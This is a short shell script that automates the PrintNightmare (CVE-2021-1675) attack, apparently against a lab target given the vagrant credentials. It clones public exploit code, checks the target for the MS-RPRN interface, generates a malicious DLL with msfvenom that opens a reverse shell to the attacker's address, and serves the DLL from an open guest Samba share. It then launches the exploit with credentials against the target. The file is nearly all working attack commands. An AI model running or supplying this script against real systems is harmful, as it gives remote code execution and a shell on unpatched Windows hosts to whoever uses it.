sudo apt update
git clone https://github.com/cube0x0/CVE-2021-1675.git ~/CVE-2021-1675
git clone https://github.com/cube0x0/impacket.git ~/impacket

cd ~/impacket

sudo python3 setup.py install
# sudo python3 examples/rpcdump.py @172.168.1.4 | grep MS-RPRN
if sudo python3 examples/rpcdump.py @172.168.1.4 | grep MS-RPRN
then
	echo "Target is vulnerable to PrintNightmare attack"
else
	exit 1
fi

# Create mal dll
msfvenom -f dll -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.168.1.5 LPORT=4444 -o /tmp/addCube.dll

# setup samba
echo "
[smb]
	comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
" | sudo tee -a /etc/samba/smb.conf
sudo systemctl start smbd
smbshare

# Start Listener using msfconsole
# msfconsole
# use multi/handler
# set payload = windows/x64/shell_reverse_tcp
# set LHOST 172.168.1.5
# set LPORT 4444

# run exploit
sudo python3 ~/CVE-2021-1675/CVE-2021-1675.py "mshome.net/vagrant:vagrant@172.168.1.4" "\\172.168.1.5\smb\addCube.dll"
